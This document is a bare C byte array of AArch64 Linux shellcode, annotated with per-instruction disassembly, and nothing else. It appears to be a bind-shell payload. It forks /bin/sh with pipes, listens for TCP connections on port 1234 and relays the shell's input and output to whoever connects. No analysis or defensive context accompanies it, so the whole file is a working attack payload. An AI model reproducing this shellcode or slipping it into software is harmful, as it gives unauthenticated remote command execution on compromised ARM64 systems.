
// Target architecture : ARMv8/AArch64 arm
// Endian mode         : little

#define EPX_SIZE 576

char EPX[] = {
  /* 0000 */ "\xff\xc3\x01\xd1" /* sub     sp, sp, #0x70               */
  /* 0004 */ "\x68\x07\x80\xd2" /* movz    x8, #0x3b                   */
  /* 0008 */ "\xe1\x03\x1f\xaa" /* mov     x1, xzr                     */
  /* 000C */ "\xe0\x03\x00\x91" /* mov     x0, sp                      */
  /* 0010 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0014 */ "\xe0\x23\x00\x91" /* add     x0, sp, #8                  */
  /* 0018 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 001C */ "\x48\x16\x80\xd2" /* movz    x8, #0xb2                   */
  /* 0020 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0024 */ "\xe0\x13\x00\xb9" /* str     w0, [sp, #0x10]             */
  /* 0028 */ "\x88\x1b\x80\xd2" /* movz    x8, #0xdc                   */
  /* 002C */ "\xe4\x43\x00\x91" /* add     x4, sp, #0x10               */
  /* 0030 */ "\xe3\x03\x1f\xaa" /* mov     x3, xzr                     */
  /* 0034 */ "\xe2\x03\x1f\xaa" /* mov     x2, xzr                     */
  /* 0038 */ "\xe1\x03\x1f\xaa" /* mov     x1, xzr                     */
  /* 003C */ "\x20\x02\x80\xd2" /* movz    x0, #0x11                   */
  /* 0040 */ "\x00\x24\xa0\xf2" /* movk    x0, #0x120, lsl #16         */
  /* 0044 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0048 */ "\xe0\x13\x00\xb9" /* str     w0, [sp, #0x10]             */
  /* 004C */ "\xa0\x02\x00\x35" /* cbnz    w0, #0xa0                   */
  /* 0050 */ "\x08\x03\x80\xd2" /* movz    x8, #0x18                   */
  /* 0054 */ "\x61\x00\x80\xd2" /* movz    x1, #0x3                    */
  /* 0058 */ "\xe2\x03\x1f\xaa" /* mov     x2, xzr                     */
  /* 005C */ "\xe3\x03\x40\xb9" /* ldr     w3, [sp]                    */
  /* 0060 */ "\xe4\x0f\x40\xb9" /* ldr     w4, [sp, #0xc]              */
  /* 0064 */ "\x21\x04\x00\xf1" /* subs    x1, x1, #1                  */
  /* 0068 */ "\x60\x00\x84\x1a" /* csel    w0, w3, w4, eq              */
  /* 006C */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0070 */ "\xa1\xff\xff\xb5" /* cbnz    x1, #0x64                   */
  /* 0074 */ "\x01\x02\x80\xd2" /* movz    x1, #0x10                   */
  /* 0078 */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 007C */ "\x21\x10\x00\xd1" /* sub     x1, x1, #4                  */
  /* 0080 */ "\xe0\x6b\x61\xb8" /* ldr     w0, [sp, x1]                */
  /* 0084 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0088 */ "\xa1\xff\xff\xb5" /* cbnz    x1, #0x7c                   */
  /* 008C */ "\xa8\x1b\x80\xd2" /* movz    x8, #0xdd                   */
  /* 0090 */ "\xe2\x03\x1f\xaa" /* mov     x2, xzr                     */
  /* 0094 */ "\xe1\x03\x1f\xaa" /* mov     x1, xzr                     */
  /* 0098 */ "\xc0\x0c\x00\x10" /* adr     x0, #0x230                  */
  /* 009C */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 00A0 */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 00A4 */ "\xe0\x03\x40\xb9" /* ldr     w0, [sp]                    */
  /* 00A8 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 00AC */ "\xe0\x0f\x40\xb9" /* ldr     w0, [sp, #0xc]              */
  /* 00B0 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 00B4 */ "\xc8\x18\x80\xd2" /* movz    x8, #0xc6                   */
  /* 00B8 */ "\x02\x00\x80\xd2" /* movz    x2, #0                      */
  /* 00BC */ "\x21\x00\x80\xd2" /* movz    x1, #0x1                    */
  /* 00C0 */ "\x40\x00\x80\xd2" /* movz    x0, #0x2                    */
  /* 00C4 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 00C8 */ "\x02\x02\x80\xd2" /* movz    x2, #0x10                   */
  /* 00CC */ "\x61\x0b\x00\x10" /* adr     x1, #0x238                  */
  /* 00D0 */ "\xe0\x1b\x00\xb9" /* str     w0, [sp, #0x18]             */
  /* 00D4 */ "\x08\x19\x80\xd2" /* movz    x8, #0xc8                   */
  /* 00D8 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 00DC */ "\xe0\x07\x00\xb5" /* cbnz    x0, #0x1d8                  */
  /* 00E0 */ "\x28\x19\x80\xd2" /* movz    x8, #0xc9                   */
  /* 00E4 */ "\x21\x00\x80\xd2" /* movz    x1, #0x1                    */
  /* 00E8 */ "\xe0\x1b\x40\xb9" /* ldr     w0, [sp, #0x18]             */
  /* 00EC */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 00F0 */ "\x48\x19\x80\xd2" /* movz    x8, #0xca                   */
  /* 00F4 */ "\xe2\x03\x1f\xaa" /* mov     x2, xzr                     */
  /* 00F8 */ "\xe1\x03\x1f\xaa" /* mov     x1, xzr                     */
  /* 00FC */ "\xe0\x1b\x40\xb9" /* ldr     w0, [sp, #0x18]             */
  /* 0100 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0104 */ "\xe1\x1b\x40\xb9" /* ldr     w1, [sp, #0x18]             */
  /* 0108 */ "\xe0\x07\x03\x29" /* stp     w0, w1, [sp, #0x18]         */
  /* 010C */ "\x88\x02\x80\xd2" /* movz    x8, #0x14                   */
  /* 0110 */ "\xe0\x03\x1f\xaa" /* mov     x0, xzr                     */
  /* 0114 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0118 */ "\xe0\x17\x00\xb9" /* str     w0, [sp, #0x14]             */
  /* 011C */ "\xe2\x1b\x40\xb9" /* ldr     w2, [sp, #0x18]             */
  /* 0120 */ "\xe4\x0b\x40\xb9" /* ldr     w4, [sp, #8]                */
  /* 0124 */ "\xa8\x02\x80\xd2" /* movz    x8, #0x15                   */
  /* 0128 */ "\x23\x00\x80\xd2" /* movz    x3, #0x1                    */
  /* 012C */ "\xe3\x0b\x02\xa9" /* stp     x3, x2, [sp, #0x20]         */
  /* 0130 */ "\xe3\x83\x00\x91" /* add     x3, sp, #0x20               */
  /* 0134 */ "\x21\x00\x80\xd2" /* movz    x1, #0x1                    */
  /* 0138 */ "\xe0\x17\x40\xb9" /* ldr     w0, [sp, #0x14]             */
  /* 013C */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0140 */ "\x5f\x00\x04\x6b" /* cmp     w2, w4                      */
  /* 0144 */ "\xe2\x03\x04\x2a" /* mov     w2, w4                      */
  /* 0148 */ "\xe1\xfe\xff\x54" /* b.ne    #0x124                      */
  /* 014C */ "\xc8\x02\x80\xd2" /* movz    x8, #0x16                   */
  /* 0150 */ "\xe4\x03\x1f\xaa" /* mov     x4, xzr                     */
  /* 0154 */ "\xe3\x03\x3f\xaa" /* mvn     x3, xzr                     */
  /* 0158 */ "\x22\x00\x80\xd2" /* movz    x2, #0x1                    */
  /* 015C */ "\xe1\x83\x00\x91" /* add     x1, sp, #0x20               */
  /* 0160 */ "\xe0\x17\x40\xb9" /* ldr     w0, [sp, #0x14]             */
  /* 0164 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0168 */ "\x20\x02\xf8\x37" /* tbnz    w0, #0x1f, #0x1ac           */
  /* 016C */ "\xe0\x07\x42\xa9" /* ldp     x0, x1, [sp, #0x20]         */
  /* 0170 */ "\xe0\x01\x00\x36" /* tbz     w0, #0, #0x1ac              */
  /* 0174 */ "\xe3\x1b\x40\xb9" /* ldr     w3, [sp, #0x18]             */
  /* 0178 */ "\xe5\x93\x40\x29" /* ldp     w5, w4, [sp, #4]            */
  /* 017C */ "\x3f\x00\x03\x6b" /* cmp     w1, w3                      */
  /* 0180 */ "\x60\x00\x84\x1a" /* csel    w0, w3, w4, eq              */
  /* 0184 */ "\xa3\x00\x83\x1a" /* csel    w3, w5, w3, eq              */
  /* 0188 */ "\xe8\x07\x80\xd2" /* movz    x8, #0x3f                   */
  /* 018C */ "\x02\x08\x80\xd2" /* movz    x2, #0x40                   */
  /* 0190 */ "\xe1\xc3\x00\x91" /* add     x1, sp, #0x30               */
  /* 0194 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0198 */ "\x08\x08\x80\xd2" /* movz    x8, #0x40                   */
  /* 019C */ "\xe2\x03\x00\x2a" /* mov     w2, w0                      */
  /* 01A0 */ "\xe0\x03\x03\x2a" /* mov     w0, w3                      */
  /* 01A4 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 01A8 */ "\xe9\xff\xff\x17" /* b       #0x14c                      */
  /* 01AC */ "\xa8\x02\x80\xd2" /* movz    x8, #0x15                   */
  /* 01B0 */ "\xe3\x03\x1f\xaa" /* mov     x3, xzr                     */
  /* 01B4 */ "\x41\x00\x80\xd2" /* movz    x1, #0x2                    */
  /* 01B8 */ "\xe0\x8b\x42\x29" /* ldp     w0, w2, [sp, #0x14]         */
  /* 01BC */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 01C0 */ "\xe2\x0b\x40\xb9" /* ldr     w2, [sp, #8]                */
  /* 01C4 */ "\xe0\x17\x40\xb9" /* ldr     w0, [sp, #0x14]             */
  /* 01C8 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 01CC */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 01D0 */ "\xe0\x17\x40\xb9" /* ldr     w0, [sp, #0x14]             */
  /* 01D4 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 01D8 */ "\x48\x1a\x80\xd2" /* movz    x8, #0xd2                   */
  /* 01DC */ "\x41\x00\x80\xd2" /* movz    x1, #0x2                    */
  /* 01E0 */ "\xe0\x1b\x40\xb9" /* ldr     w0, [sp, #0x18]             */
  /* 01E4 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 01E8 */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 01EC */ "\xe0\x1b\x40\xb9" /* ldr     w0, [sp, #0x18]             */
  /* 01F0 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 01F4 */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 01F8 */ "\xe0\x1f\x40\xb9" /* ldr     w0, [sp, #0x1c]             */
  /* 01FC */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0200 */ "\x28\x10\x80\xd2" /* movz    x8, #0x81                   */
  /* 0204 */ "\x21\x02\x80\xd2" /* movz    x1, #0x11                   */
  /* 0208 */ "\xe0\x13\x40\xb9" /* ldr     w0, [sp, #0x10]             */
  /* 020C */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0210 */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 0214 */ "\xe0\x07\x40\xb9" /* ldr     w0, [sp, #4]                */
  /* 0218 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 021C */ "\x28\x07\x80\xd2" /* movz    x8, #0x39                   */
  /* 0220 */ "\xe0\x0b\x40\xb9" /* ldr     w0, [sp, #8]                */
  /* 0224 */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0228 */ "\xa8\x0b\x80\xd2" /* movz    x8, #0x5d                   */
  /* 022C */ "\x01\x00\x00\xd4" /* svc     #0                          */
  /* 0230 */ "\x2f\x62\x69\x6e"
  /* 0234 */ "\x2f\x73\x68\x00"
  /* 0238 */ "\x02\x00\x04\xd2"
  /* 023C */ "\x00\x00\x00\x00"
};
